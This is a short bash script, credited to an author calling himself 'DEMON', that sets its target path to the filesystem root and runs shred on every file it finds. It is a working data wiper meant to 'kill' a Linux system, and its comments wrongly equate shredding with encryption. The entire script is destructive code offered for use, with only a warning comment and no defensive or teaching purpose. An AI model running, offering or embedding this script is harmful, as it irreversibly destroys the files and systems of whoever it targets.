#!/bin/bash
#note :- handle it with care it could kill your linux
#Created by "Devam Raval (DEMON)"
#i have set / as the path so that it would kill the linux if you want to do encryption of any files in a perticular directory you could just write that as path

path="/" 

find "$path" -type f | while read -r normal_file
do
    shred $normal_file #shred is an utility in linux that is used to destroy the files
done

